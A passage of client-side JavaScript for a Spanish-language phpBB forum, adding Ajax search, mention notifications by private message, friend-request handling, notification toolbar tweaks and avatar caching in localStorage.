                        w[i].getElementsByTagName('ol')[0].innerHTML = '<br/><br/><span class="code_invitado" style="text-align: center; display: block; font-size: 18px; font-family: monda; color: red; margin-left: -38px;"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Invitado para ver el código debes estar registrado</span><br/><br/>';
                    }
                }
            }, 500)
        },
        //variables
        aXjS_: function () {
            var b, c, d, e, g, i, h, j, a = $.getby('#fa_textarea');
            a.setAttribute('onkeypress', 'if (event.keyCode==13){return false}');
            a.onkeyup = function (o) {
                if (a.value.length != 0 && !$.getby('#ajaxSearch')) {
                    b = $.getby('#fa_textarea');
                    c = document.createElement('div');
                    c.innerHTML = '<div class="flecha"></div><div id="ajaxSearch"></div>';
                    c.style = 'display:inherit;';
                    c.classList.add('search_adv');
                    c.id = 'aj_s';
                    $._insertAfter(b, c);
                }
                d = $.getby('#ajaxSearch'),
                    e = $.getby('#aj_s'),
                    g = this.value.replace(/\s/g, '+');
                console.log('texto: ' + g);
                d && (d.style.left = this.offsetLeft + 'px', d.style.top = this.offsetTop + 20 + 'px');
                0 === this.value.length && d ? (e.remove()) : this.value.length > 3 ? (d.innerHTML = '', $.get('/search?mode=searchbox&search_keywords=' + g + '&show_results=topics', function (f) {
                    h = $('.error', f);
                    j = $('.topictitle', f);
                    if (h.length && h[0].textContent.indexOf('No hay temas') > 0) {
                        d.innerHTML = 'No hay resultados'
                    } else {
                        for (d.innerHTML = '', i = 0; i < j.length; i++) d.innerHTML += '<div class="ajaxResult"><a href="' + j[i].href + '"> ' + j[i].textContent + '</a></div>';
                    }
                }).success(function () {
                    ops.prefijos_all_add()
                })) : d.innerHTML = 'Muy corto'
            };
        },
        QTips: function () {
            var options = {
                    animation: 'fade',
                    arrow: true,
                    speed: 300,
                    delay: 300,
                    onlyOne: true,
                    theme: 'tooltipster-ops'
                },
                queue = true,
                titles,
                parse = function () {
                    titles = $('[title]');
                    titles.tooltipster && titles.not('[title=""], .mentiontag, .tooltipstered').tooltipster(options);
                };
            queue ? $(parse) : parse();
        },
        Me_Mo: function () {
            if (ops.logout) {
                var active = pu && $.getby('.activetab')[0],
                    b = pu && active.textContent,
                    t_A = pu && active.textContent.indexOf('uro') > 0,
                    t_a = pu && active.textContent.indexOf('visitantes') > 0,
                    ed = tm ? ($.getby('#editor-textarea')) : (t_A || t_a) ? ($.getby('#AAGquickvm_message')) : ind && ($.getby('#avac_status_textarea')),
                    a = tm && $.getby('#avatar'),
                    c = tm && $.getby('#editor-textarea');
                tm && (a.innerHTML = ops.mi_avatar);
                ed.onkeyup = function () {
                    ops.arroba(this, ed);
                    console.log(this.value);
                    if (tm) {
                        $._fadeOut(a, 200);
                        this.onblur = function () {
                            $._fadeIn(a, 200);
                        }
                    }
                }
            }
        },
        arroba: function (c, z) {
            var e, d, f, g, i, j, h, k, active = pu && $.getby('.activetab')[0],
                b = pu && active.textContent,
                t_A = pu && active.textContent.indexOf('uro') > 0,
                t_a = pu && active.textContent.indexOf('visitantes') > 0;
            '@' === c.value.split('')[c.value.length - 1] &&
                (e = (c.value, c.value.split('@')), $.boxes({
                    mode: 'prompt',
                    title: 'Introduce el nombre del usuario a mencionar Un mensaje de notificación será enviado',
                    ok: function () {
                        var t, boxinput = $.getby('.zzBoxes_input'),
                            s = boxinput.length && (boxinput[0]);
                        (t_A || t_a) ? (z.value += s.value, t = s.value, d = '[Mensaje automático]: Te he mencionado en: ' + ops.titulo_pagina, f = '[quote]Hola {USERNAME}, Te he mencionado en :[url=' + window.location + ']' + ops.titulo_pagina + '[/url] \n ' + e[0] + '[/quote]', g = '/privmsg?mode=post&post=1', h = 'inbox', i = 'post', j = ' se mencionó con éxito', k = 'Send') : tm ? (z.value += '"' + s.value + '" ', z.focus(), t = s.value, d = '[Mensaje automático]: Te he mencionado en: ' + ops.titulo_pagina, f = '[quote]Hola {USERNAME}, Te he mencionado en :[url=' + window.location + ']' + ops.titulo_pagina + '[/url] \n ' + e[0] + '[/quote]', g = '/privmsg?mode=post&post=1', h = 'inbox', i = 'post', j = ' se mencionó con éxito', k = 'Send') : ind && (z.value += s.value, t = s.value, d = '[Mensaje automático]: Te he mencionado desde mi muro, en el indice ', f = '[quote]Hola {USERNAME}, Te he mencionado desde [url=http://opensourcephpbb3.com/u' + ops.mi_id + ']Mi muro[/url] \n ' + e[0] + '[/quote]', g = '/privmsg?mode=post&post=1', h = 'inbox', i = 'post', j = ' se mencionó con éxito', k = 'Send'), ops.post_mw(t, d, f, g, i, j, h, k, '');
                    },
                    cancel: function () {
                        return false
                    }
                }))
        },
        //variables
        marcar_leidos: function (c) {
            var url = c.href;
            $.get(url).success(function () {
                var e = ind ? $.getby('.icon') : $.getby('.row');
                for (var t = 0; t < e.length; t++) {
                    /newpost/g.test(e[t].className) && e[t].classList.remove('newpost')
                }
                ops.notify(ops.mi_nombre + ': Se marcaron como leídos todos los temas');
            }).error(function () {
                $.boxes('alert', 'Fallo, intentalo de nuevo');
            })
        },
        m_rSb: function () {
            var e = $.getby('a');
            for (var t = 0; t < e.length; t++) {
                /\?mark=topics/g.test(e[t].href) && e[t].setAttribute('onclick', 'ops.marcar_leidos(this);return false');
            }
        },
        a_f: function () {
            $.get('/profile?mode=editprofile&page_profil=friendsfoes', function (e) {
                if (e.indexOf(' alt="Aceptar"') > 0 && e.indexOf('title="Aceptar"') > 0) {
                    var c, d, e, t, a = $('.panel', e)[3].getElementsByClassName('friends-foes-list')[0],
                        b = document.body;
                    if ('undefined' != typeof a) {
                        c = a.outerHTML;
                        b.insertAdjacentHTML('beforeend', c);
                        d = $.getby('.friends-foes-list')[0];
                        e = d.getElementsByClassName('sprite-tabs_more')[0];
                        d.classList.add('indexfrs');
                        t = '<i class="fa fa-check-circle-o sprite-tabs_more" style="color:rgb(0, 128, 0);font-size:18px;position:absolute;margin-top:7px;"></i>';
                        e.outerHTML = t;
                    }
                }
            }).success(function () {
                ops.a_f_avatar();
                ops._ae_perfil();
            })
        },
        _ae_perfil: function () {
            var c, d, e, a,
                b = $.getby('.friends-foes-list');
            for (var i = 0; i < b.length; i++) {
                e = b[i].getElementsByClassName('sprite-tabs_more')[0].parentNode.parentNode.getElementsByTagName('strong');
                a = e.length && e[0].textContent;
                c = b[i].getElementsByClassName('sprite-tabs_more')[0].parentNode.parentNode,
                    d = b[i].getElementsByClassName('sprite-tabs_more')[0].parentNode.href;
                b[i].parentNode.onclick = function () {
                    $.get(d).success(function () {
                        ops.notify(a + ': Te acepte como amigo');
                        $._fadeOut(c, 500);
                        ops.Nacti_msg = '[url=http://opensourcephpbb3.com/u' + ops.mi_id + ']' + ops.mi_nombre + '[/url] y [url=http://opensourcephpbb3.com' + d + ']' + a + '[/url], se han hecho amigos';
                        ops.Na();
                    }).error(function () {
                        $.boxes(' alert', 'intenta de nuevo');
                    });
                    return false
                };
            }
        },
        AdPf_: function () {
            var c, b, d, e, a = $.getby('#profile-advanced-add');
            if (a) {
                b = a.getElementsByTagName('a'),
                    d = 'background-position:15px 50%;text-indent:0px;padding-left:50px;width:945px;z-index:50;line-height:30px;color:rgb(255, 255, 255);left:-857px;transition:all 550ms ease 0s',
                    e = a.getElementsByClassName('mainmenu');
                if (b.length) {
                    b[0].onclick = function () {
                        c = this.href,
                            $.get(c).success(function () {
                                e[0].textContent = 'Solicitud enviada';
                                e[0].style = d;
                            }).error(function () {
                                $.boxes('alert', 'inténtalo de nuevo')
                            });
                        return false
                    }
                }
            }
        },
        toolbar_init: function () {
            var a = $.getby('#fa_share'),
                b = $.getby('#fa_search'),
                c = $.getby('#fa_service'),
                d = $.getby('#fa_usermenu'),
                e = $.getby('#fa_magnifier'),
                f = $.getby('#fa_textarea'),
                h = $.getby('#fa_right'),
                i = '<a id="fa_magnifier" style="display: inline-block !important;" class="lupa"></a>',
                k = ops.logout && d.children[2].children[0].children[1],
                g = [a, c, e, k];
            if (g) {
                for (var t = 0; t < g.length; t++) {
                    g[t] && g[t].remove()
                }
            }
            f.setAttribute('placeholder', 'Busqueda inteligente...');
            f.setAttribute('style', 'text-indent: 3px!important');
            f.onfocus = function () {
                this.setAttribute('placeholder', 'Busca en Open Source usando Ajax');
                this.style.width = '300px'
                ops.aXjS_();
                this.onblur = function () {
                    this.setAttribute('placeholder', 'Busqueda inteligente...');
                    this.style.width = '200px'
                };
            };
            f.insertAdjacentHTML('afterend', i);
            ops.Av_tb(), ops.t_tbC(), ops.m_tbC(), ops.efect_live(), ops.logout && ops.Fv_tB_();
            setTimeout(function () {
                b.style = 'display:inline-block!important';
                h.setAttribute('style', 'display:inline-block!important')
            }, 1000);
        },
        efect_live: function () {
            FA.Notif = {
                Check: function () {
                    for (var a = $.getby('.fa_notification'), i = 0, j = a.length; i < j; i++) {
                        if (!/none/.test(a[i].style.display) && !/faUnbound/.test(a[i].className)) {
                            a[i].className += ' faUnbound';
                            $(a[i]).stop(true, true).off('mouseover mouseleave');
                            $(a[i]).fadeIn(102, function () {
                                $(this).mouseover(function () {
                                    $(this).stop(true, true)
                                });
                                $(this).mouseleave(function () {
                                    $(this).delay(1000).animate({
                                        marginLeft: '350px'
                                    }, 600)
                                });
                                $(this).attr('style', 'margin-left:350px;').animate({
                                    marginLeft: '0px'
                                }, 600, function () {
                                    $(this).delay(10000).animate({
                                        marginLeft: '350px'
                                    }, 600)
                                })
                            })
                        }
                    }
                },
                Int: null
            };
            FA.Notif.Int = window.setInterval(FA.Notif.Check, 1000)
        },
        Av_tb: function () {
            var a = document.createElement('SPAN'),
                b = $.getby('#fa_welcome'),
                c = 'width: 20px;height: 20px;position: relative;top: -7px;margin-right: 5px;margin-bottom: -12px;border: 1px solid rgb(204, 204, 204);border-radius: 100%;margin-left: -3px;';
            b && ops.logout && (a.innerHTML = ops.mi_avatar.replace(/(<img) (src=".*)/, '$1 style="' + c + '" $2'), b.insertBefore(a, b.firstChild))
        },
        storage: function (id, html, info) {
            var w = window.localStorage,
                a = info == 'Almacenando miniaturas' ? 'mini_por_' : 'user_ava_',
                b = info == 'Almacenando miniaturas' ? 'mini_exp_' : 'user_exp_';
            if (!w.getItem('user_ava_' + id) || w.getItem('user_exp_' + id) < +new Date - 24 * 60 * 60 * 1000) {
                w.setItem(a + id, html);
                w.setItem(b + id, +new Date);
                console.log(info + '-' + id + '-' + html);
            }
        },
        mI_Sb: function () {
            try {
                var p = $.getby('.PreviewImg'),
                    s = window.localStorage,
                    l = p.length;
                for (var i = 0; i < l; i++) {
                    var t, e = p[i].parentNode.getElementsByClassName('topictitle')[0].href;
                    if ('undefined' != typeof e) {
                        t = e.match(/\d+/g)[1];
                        if (s.getItem('mini_por_' + t) && s.getItem('mini_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                            var a = s.getItem('mini_por_' + t);
                            p[i].innerHTML = a;
                            console.log('Se cargaron las miniaturas almacenadas img:' + a)
                        } else {
                            $(p[i]).load(e + ' .post:first .content img:eq(0)[alt]:last', function () {
                                var
                                    t = Number(this.parentNode.getElementsByClassName('topictitle')[0].href.match(/\d+/g)[1]);
                                ops.storage(t, this.innerHTML, 'Almacenando miniaturas');
                            })
                        }
                    }
                }
            } catch (e) {
                'undefined' != typeof console && console.error(e)
            }
        },
        aV_Sb: function () {
            var u = $.getby('.users_view')[0].getElementsByTagName('a'),
                l = u.length,
                w = window.localStorage;
            if (l) {
                u[0].insertAdjacentHTML('beforebegin', '<br/>')
                for (var i = 0; i < l; i++) {
                    var o, t = u[i].href;
                    if ('undefined' != typeof t) {
                        o = Number(t.replace(/.*?\/u(\d+)/, '$1'));
                        console.log('id de avatar sub:' + o);
                        u[i].classList.add('t_avatar');
                        u[i].setAttribute('title', u[i].textContent);
                        if (w.getItem('user_ava_' + o) && w.getItem('user_exp_' + o) > +new Date - 24 * 60 * 60 * 1000) {
                            u[i].innerHTML = w.getItem('user_ava_' + o)
                        } else {
                            $(u[i]).load(t + ' #profile-advanced-right .module:first div img:first', function () {
                                t = Number(this.href.match(/.*?\/u(\d+)/)[1]);
                                ops.storage(t, this.innerHTML, 'Almacenando avatares de los subforo =');
                            })
                        }
                    }
                }
            }
        },
        aV_In: function () {
            var av = $.getby('.log-in')[0].getElementsByTagName('a'),
                a = window.localStorage;
            for (var i = 0; i < av.length; i++) {
                var o, t = av[i].href;
                o = Number(t.replace(/.*?\/u(\d+)/, '$1'));
                av[i].classList.add('t_avatar');
                av[i].setAttribute('title', av[i].textContent);
                av[i].href = av[i].href + 'wall'
                if ('undefined' != typeof t) {
                    console.log('id de avatar indice:' + o);
                    if (a.getItem('user_ava_' + o) && a.getItem('user_exp_' + o) > +new Date - 24 * 60 * 60 * 1000) {
                        av[i].innerHTML = a.getItem('user_ava_' + o)
                    } else {
                        $(av[i]).load(t + ' .module:first div img:first', function () {
                            t = Number(this.href.match(/.*?\/u(\d+)/)[1]);
                            ops.storage(t, this.innerHTML, 'Almacenando avatares de del indice =');
                        })
                    }
                }
            }
        },
        a_f_avatar: function () {
            var a = $.getby('.indexfrs'),
                w = window.localStorage,
                b = '<span class="user-ava"><img src="' + ops.lang.img_ava_default + '"/></span>';
            for (var i = 0; i < a.length; i++) {
                var t, c, e = a[i].getElementsByTagName('a')[0].href;
                if ('undefined' != typeof e) {
                    t = Number(e.replace(/.*?\/u(\d+)/, '$1'));
                    a[i].classList.add('avanotif_');
                    a[i].insertAdjacentHTML('afterbegin', b);
                    c = a[i].getElementsByClassName('user-ava')[0];
                    if (w.getItem('user_ava_' + t) && w.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                        c.innerHTML = w.getItem('user_ava_' + t)
                    } else {
                        $(c).load(e + ' #profile-advanced-right .module:first div img:first', function () {
                            t = Number(this.parentNode.getElementsByTagName('a')[0].href.match(/.*?\/u(\d+)/)[1]);
                            ops.storage(t, this.innerHTML, 'Almacenando avatares de a_f_avatar = ');
                        })
                    }
                }
            }
        },
        n_Al: function () {
            var b = $.getby('.fa_notification'),
                w = window.localStorage,
                html = '<div class="avanotif"><img src="' + ops.lang.img_ava_default + '"/></div>',
                ruta = ' #profile-advanced-right .module:first div img:first';
            for (var i = 0; i < b.length; i++) {
                var t, u = b[i].getElementsByTagName('a'),
                    e = /\/u(\d+)/g.test(u[0].href) ? u[0].href : u[1].href;
                if ('undefined' != typeof e) {
                    t = Number(e.replace(/.*?\/u(\d+)/, '$1'));
                    !b[i].getElementsByClassName('avanotif').length && b[i].children[0].insertAdjacentHTML('afterbegin', html);
                    if (w.getItem('user_ava_' + t) && w.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                        console.log('id de avatar almacenado live notif:' + t);
                        b[i].getElementsByClassName('avanotif')[0].innerHTML = w.getItem('user_ava_' + t);
                    } else {
                        $(b[i].getElementsByClassName('avanotif')[0]).load(e + ruta, function () {
                            t = Number(this.parentNode.getElementsByTagName('a')[1].href.match(/.*?\/u(\d+)/)[1]);
                            ops.storage(t, this.innerHTML, 'Almacenando avatares de Live notif = ');
                        })
                    }
                }
            }
        },
        aVP_s_: function () {
            var t, e, f, a = $.getby('.friends-foes-list'),
                b = a.length,
                c = '<span class="user-ava"><img src="' + ops.lang.img_ava_default + '"/></span>',
                d = window.localStorage;
            for (var i = 0; i < b; i++) {
                e = a[i].getElementsByTagName('a')[0].href;
                if ('undefined' != typeof e) {
                    t = Number(e.replace(/.*?\/u(\d+)/, '$1'));
                    a[i].classList.add('avanotif_');
                    !a[i].getElementsByClassName('user-ava').length && (a[i].insertAdjacentHTML('afterbegin', c));
                    f = a[i].getElementsByClassName('user-ava')[0];
                    if (d.getItem('user_ava_' + t) && d.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                        f.innerHTML = d.getItem('user_ava_' + t);
                        console.log('Avatares storage')
                    } else {
                        $(f).load(e + ' #profile-advanced-right .module:first div img:first', function () {
                            var t = Number(this.parentNode.getElementsByTagName('a')[0].href.match(/\d+/g)[1]);
                            console.log('Avatares ajax');
                            ops.storage(t, this.innerHTML, 'Almacenando avatares de Lista de amigos = ');
                        })
                    }
                }
            }
        },
        avatarnews: function () {
            var w, n = $.getby('.avanews'),
                l = n.length;
            for (var i = 0; i < l; i++) {
                var t, a = n[i].parentNode.getElementsByClassName('url_link')[0].href,
                    w = window.localStorage;
                if ('undefined' != typeof a) {
                    t = Number(a.replace(/.*?\/u(\d+)/, '$1'));
                    console.log('id de noticias' + t);
                    if (w.getItem('user_ava_' + t) && w.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                        n[i].innerHTML = w.getItem('user_ava_' + t);
                        console.log('Usando almacenados, id de avatar noticias:' + t);
                    } else {
                        $(n[i]).load(a + ' #profile-advanced-right .module:first div img:first', function () {
                            console.log('usando avatares en noticias vía ajax');
                            t = Number(this.parentNode.getElementsByClassName('url_link')[0].href.match(/.*?\/u(\d+)/)[1]);
                            ops.storage(t, this.innerHTML, 'Almacenando avatares de news= ');
                        })
                    }
                }
            }
        },
        nAtb_: function () { //variables
            var a, s, r, t, i, e, img, li = $.getby('#notif_list').getElementsByClassName('contentText'),
                l = li.length,
                h = '<span id="conImagen" class="user-ava"></span>';
            for (i = 0; i < l; i++) {
                if (!li[i].getElementsByClassName('user-ava').length) {
                    (li[i].insertAdjacentHTML('afterbegin', h));
                }
            }
            a = $.getby('#notif_list').getElementsByTagName('a'),
                r = a.length,
                s = window.localStorage;
            if (l) {
                for (i = 0; i < r; i++) {
                    e = /\/u(\d+)/g.test(a[i].href) && a[i].href;
                    img = a[i].parentNode.parentNode.parentNode.getElementsByClassName('user-ava')[0];
                    console.log('id:' + e);
                    if ('undefined' != typeof e && !img.getElementsByTagName('img').length) {
                        t = e != false && e.replace(/.*?\/u(\d+)/, '$1');
                        if (s.getItem('user_ava_' + t) && s.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                            console.log('usando avatar almacenado en lista de notif:' + t);
                            img.innerHTML = s.getItem('user_ava_' + t);
                        } else if (e != false) {
                            $(img).load(e + ' #profile-advanced-right .module:first div img:first', function () {
                                var a = this.parentNode.getElementsByTagName('a'),
                                    b = this.innerHTML,
                                    h = /\/u(\d+)/g.test(a[0].href) ? a[0].href : a[1].href,
                                    t = Number(h.match(/.*?\/u(\d+)/)[1]);
                                console.log('Avatar establecido via ajax');
                                ops.storage(t, b, 'Avatar establecido via ajax, almacenando avatares de Lista de notificaciones = ');
                            })
                        }
                    }
                }
            }
        },
        aTsF_: function () {
            setTimeout(function () {
                if ($.getby('.myStaff').length) {
                    var s = $.getby('.myStaff')[0].getElementsByTagName('a'),
                        l = s.length,
                        w = window.localStorage;
                    for (var i = 0; i < l; i++) {
                        var t, e = s[i].href;
                        if ('undefined' != typeof e) {
                            t = Number(e.replace(/.*?\/u(\d+)/, '$1'));
                            console.log('staff' + t);
                            s[i].classList.add('t_avatar');
                            s[i].setAttribute('original-title', s[i].textContent);
                            if (w.getItem('user_ava_' + t) && w.getItem('user_exp_' + t) > +new Date - 24 * 60 * 60 * 1000) {
                                s[i].innerHTML = w.getItem('user_ava_' + t);
                            } else {
                                $(s[i]).load(e + ' #profile-advanced-right .module:first div img:first', function () {
                                    t = Number(this.href.match(/.*?\/u(\d+)/)[1]);
                                    ops.storage(t, this.innerHTML, 'Almacenando avatares de Staff = ');
                                })
                            }
                        }
                    }
                }
            }, 1000)
        },
        fN_lt: $.getby('#notif_list'),
        FmA_v: function () {
            var a = $.getby('#notif_list').getElementsByClassName('delete'),
                b = a.length
            for (var i = 0; i < b; i++) {
                a[i].onclick = function () {
                    setTimeout(function () {
                        ops.nAtb_()
                    }, 500)
                }
            }
        },
        t_tbC: function () {
            var e = compileNotif;
            Toolbar.compileNotif = compileNotif = function (t) {
                var o = e(t);
                if (t.text.type === FA.Notification.NOTIF_TOPIC_WATCH) {
                    var a = o.match(/^(.*) ha escrito un mensaje en (<a href="\/t[0-9]+(p[0-9]+)?-([^#"]*)#[0-9]+">)[^<]+<\/a>$/);
                    a && (t = a[1] + ' también ha comentado en : ' + a[2], o = a[4].replace(/\?nid=(\d+)/g, ''), o = 'topic' === o || /^[\s-]*$/.test(o) ? 'este tema' : o.replace(/-/g, ' ').replace(/(^\s+|\s+$)/g, ''), o = t + o + '</a>')
                }
                return o
            }
        },
        m_tbC: function () {
            var e = compileNotif;
            Toolbar.compileNotif = compileNotif = function (t) {
                var o = e(t);
                if (t.text.type === FA.Notification.NOTIF_MENTION) {
                    var a = o.match(/^(.*) te ha mencionado (<a href="\/t[0-9]+(p[0-9]+)?-([^#"]*)#[0-9]+">)[^<]+<\/a>$/);
                    a && (t = a[1] + ' te menciono en : ' + a[2], o = a[4].replace(/\?nid=(\d+)/g, ''), o = 'topic' === o || /^[\s-]*$/.test(o) ? 'en un mensaje' : o.replace(/-/g, ' ').replace(/(^\s+|\s+$)/g, ''), o = t + o + '</a>');
                }
                return o
            }
        },
        cero_notif: function () {
            var a = $.getby('#cero_notif'),
                b = document.querySelectorAll('li[id*="n"]'),
                c = $.getby('#notif_list'),
                d = $.getby('.eliminar'),
                e = d.length;
            if (b.length == 1) {
                a && a.remove();
            } else if (b.length == 0 || e) {
                var f = c.getElementsByClassName('see_all')[0],
                    g = '<div id="cero_notif" style="margin-left: -8px;background:rgb(255, 255, 255);width: 330px;height:37px;border:1px solid rgb(204, 204, 204);display:none"><i class="fa fa-bell-slash" style="font-size:20px;color:rgb(255, 0, 0);margin-top:8px;float:left"></i><span "cero_notif_texto" style="margin-top:12px;display:flex;margin-left:114px;color:rgb(255, 0, 0);font-weight:bold;">No hay notificaciones</span></div>';
                f.insertAdjacentHTML('afterbegin', g);
                f.classList.add('cero_not');
                ops.remove_li();
                a = $.getby('#cero_notif');
                a.style.display = 'block';
                Toolbar._alignNotifications()
            }
        },
        remove_li: function () {
            var a = $.getby('.eliminar'),
                b = a.length;
            if (b) {
                for (var i = 0; i < b; i++) {
                    a[i].style.display = 'none'
                }
            }
        },
        wrelo: function () {
            var a = $.getby('.wiaag');
            a.style.display = 'block';
            a.innerHTML = '<center style="margin-top:25%"><i style="color:rgb(0, 0, 0);font-size:32px"class="fa fa-spinner fa-spin"></i></center>';
            setTimeout(function () {
                ops.loadwall()
            }, 700)
        },
        mpreload: function () {
            var URL = $.getby('.mp1')[0].getElementsByTagName('a')[0];
            ops.tabs_mp_ajax('inbox', URL)
        },
        favIC: $.getby('#fav_icon').href,
        fav_i: function () {
            var a = $.getby('#notif_unread'),
                b = $.getby('#fav_icon');
            '' === a.innerHTML || '1' === a.innerHTML && a.style.display == 'none' ? b.href != ops.favIC && (b.href = ops.favIC, document.title = ops.titulo_pagina) : (b.href = 'http://i68.tinypic.com/i3ure8.png', document.title = '(' + ops.count + ') ' + ops.titulo_pagina)
        },
        t_Fs: function () {
            if (_notif_timeout = 0, _notif_check = window.setInterval(function () {
                    return 10000 == _notif_timeout ? window.clearInterval(_notif_check) : $.getby('.contentText').length ? (ops.nAtb_(), window.clearInterval(_notif_check)) : void(_notif_timeout += 1)
                }, 1), !ops.logout) return !1;
            var t = (setInterval(function () {
                null !== ops.welcome && (ops.logout.href = ops.logout.href);
                ops.logout.onclick = function (e) {
                    localStorage.setItem('logout', 1)
                }
            }, 500), Toolbar.refresh);
            Toolbar.refresh = function (e) {
                ops.l_Ntf = $.getby('#live_notif');
                t(e), ops.init_frs_f();
                if (ind && ops.l_Ntf.lastChild != null) {
                    ops.l_Ntf.lastChild.textContent.indexOf('muro') > 0 && ops.wrelo()
                }
                (ops.l_Ntf.lastChild != null && ops.l_Ntf.lastChild.textContent.indexOf('mensaje privado') > 0 && mp && !isMPNew) && ops.mpreload(),
                    setTimeout(function () {
                        ops.count = $.getby('#notif_unread') && ($.getby('#notif_unread').textContent);
                        ops.fav_i(), ops.FmA_v()
                    }, 1e3), ops.nAtb_(), notif_pos = $('#' + Toolbar.NOTIFICATIONS).length > 0 ? $('#' + Toolbar.NOTIFICATIONS).position() : null, ops.cero_notif(), e.unread && ($('#cero_notif').remove(), $('#' + Toolbar.NOTIF_UNREAD).text(e.unread), ops.n_Al(), ops.Au_Tb())
            }
        },
        init_frs_f() {
            ops.l_Ntf = $.getby('#live_notif');
            ops.l_Ntf.firstChild && ops.l_Ntf.firstChild.textContent.indexOf('amistad') != -1 && setTimeout(function () {
                ops.a_f()
            }, 700)
        },
        Au_Tb: function () {
            ops.audio.volume = .33;
            ops.audio.play()
        },
        Fv_tB_D: function () {
            var e = '<div id="see_all_plus" style="margin-right: 35px; line-height: 1.5; padding-top: 5px;"><i class="fa fa-check-square"></i><a class="read_notif_" href="/profile?mode=editprofile&page_profil=notifications" style="font-size:11px;color: rgb(255, 255, 255)!important;" onclick="ops.Dl_TbF(\'d_leidas\',this);return false"> Marcar como leídas</a><i class="fa fa-trash"></i><a class="delete_notif_plus" href="#" onclick="ops.Dl_TbF(\'d_todo\',this);return false"> Borrar todo</a><i class="fa fa-plus-square"></i><a href="/profile?mode=editprofile&amp;page_profil=notifications"> Ver más</a></div>',
                h = $.getby('#notif_list');
            h && (h.lastChild.innerHTML = e)
        },
        Dl_TbF: function (e, t) {
            switch (e) {
            case 'd_leidas':
                $.get(t.href).success(function () {
                    ops.notify(ops.mi_nombre + ' todas las notificaciones se marcaron como leídas')
                    ops.unread(e)
                });
                break;
            case 'd_todo':
                $.post('/profile?mode=editprofile&page_profil=notifications', {
                    delete_all: 1,
                    tid: isTid
                }).success(function () {
                    ops.notify(ops.mi_nombre + ': Se eliminaron todas las notificaciones.');
                    ops.unread(e)
                });
                break;
            }
        },
        return_title: function () {
            var a = $.getby('#notif_unread'),
                b = $.getby('#fav_icon'),
                c = document.title;
            b.href = 'http://adictosalgear.org/bowling-ball.ico';
            a.innerHTML = '';
            c = c.match(/[^\(.*\)]\w.+/g)[0]
        },
        unread: function (e) {
            var a = $.getby('#notif_list').getElementsByTagName('li'),
                l = a.length;
            for (var i = 0; i < l; i++) {
                if (/[n](\d+)/g.test(a[i].id) && e == 'd_leidas') {
                    a[i].classList.remove('unread');
                } else if (/[n](\d+)/g.test(a[i].id) && e == 'd_todo') {
                    a[i].classList.add('eliminar');
                }
            }
            e == 'd_todo' && ops.cero_notif();
            document.title = ops.titulo_pagina;
            $.getby('#notif_unread').innerHTML = '';
            ops.rC_tB();
            ops.return_title()
        },
        me_avatar: function () {
            var u = $.getby('img');
            for (var r = 0; r < u.length; r++) {
                var e = u[r].src,
                    t = $(ops.mi_avatar)[0].src;
                e === t && u[r].classList.add('me')
            }
        },
        c_A_jx: function () {
            var e, b, a = $.getby('.avatar_ajax'),
                c = window.localStorage;
            if (a.length) {
                a[0].onclick = function () {
                    ops.me_avatar();
                    $.boxes({
                        mode: 'prompt',
                        title: 'Introduce el link del avatar que deseas colocar en tu perfil',
                        ok: function () {
                            e = $.getby('.zzBoxes_input')[0].value;
                            $.post('/profile', {
                                page_profil: 'avatars',
                                mode: 'editprofile',
                                user_id: ops.mi_id,
                                avatarurl: e,
                                submit: 1
                            }).done(function () {
                                var b = $.getby('img');
                                for (var i = 0; i < b.length; i++) {
                                    if (/me/g.test(b[i].className)) {
                                        b[i].style.display = 'none';
                                        b[i].src = e;
                                        $._fadeIn(b[i], 500)
                                    }
                                }
                                ops.Nacti_msg = ops.mi_nombre + ' cambio su avatar ';
                                ops.Na();
                                c.removeItem('user_ava_' + ops.mi_id);
                                c.setItem('user_ava_' + ops.mi_id, '<img src="' + e + '">');
                                ops.notify(ops.mi_nombre + ': El avatar fue cambiado')
                            })
                        }
                    })
                };
            }
        },
        tM_Sm: function () {
            var t, e = $.getby('input');
            for (t = 0; t < e.length; t++)
                if (/subject/.test(e[t].name)) {
                    var o = document.createElement('DIV');
                    o.innerHTML = '<div class="h3 similar_title"style="display:none;">Temas similares:</div><div id="topicSimilar" style="display:none;background:rgb(255, 255, 255);width:511px;margin-top:10px;padding:5px;border:1px dashed rgb(63, 76, 107)"></div>';
                    e[t].parentNode.appendChild(o);
                    e[t].onkeyup = function () {
                        var e = $.getby('#topicSimilar'),
                            t = $.getby('.similar_title')[0];
                        this.value.length > 5 && 0 != this.value ? (e.style.display = 'block', $(e).load('/search?search_keywords=' + encodeURIComponent(this.value) + ' a.topictitle', function () {
                            t.style = 'display:block;visibility:visible;text-transform:capitalize;margin-bottom:-10px;margin-top:5px', e.style.display = 'block';
                            var i = this.getElementsByTagName('a');
                            if (i) {
                                for (var a = 0; a < i.length; a++) i[a].setAttribute('target', '_blank'), i[a].style.display = 'block', i[a].classList.add('simi');
                                ops.prefijos_all_add()
                            }
                            setTimeout(function () {
                                0 == $.getby('.simi').length && (e.innerHTML = 'No se encuentran temas similares')
                            }, 1e3)
                        })) : (e.innerHTML = 'No has escrito nada', setTimeout(function () {
                            e.style.display = 'none';
                            t.style.display = 'none';
                        }, 500))
                    }
                }
        },
        confirm: function () {
            $.cachedScript('http://www.adictosalgear.org/js/confirm.js')
        },
        b_UnL: function () {
            var a = $.getby('#editor-textarea');
            a && (window.onbeforeunload = function () {
                if (a.value.length) {
                    return ops.mi_nombre + 'no'
                }
            });
        },
        soporte_mp: function (o) {
            var t = ops.nombre_editor,
                d = '[Mensaje automático] Tema nuevo en soporte: ' + o,
                f = ops.mi_nombre + ' creó un nuevo tema en soporte, dale seguimiento',
                g = '/privmsg?mode=post&post=1',
                h = 'inbox',
                i = 'post',
                j = ops.mi_nombre + ' un mp se envió al staff para que le den rápida atención a tu tema de soporte',
                k = 'Send',
                z = '2'
            t.length > 0 && ops.post_mw(t, d, f, g, i, j, h, k, z)
        },
        b_Vts: function () {
            if (!ops.logout && !Cookies.get('popuphide')) {
                var a = '¡Somos un foro diferente, tenemos muchos códigos, y te podemos decir como usarlos, modificarlos, además de atender tus más caprichosos deseos, no pierdes nada con registrarte! ',
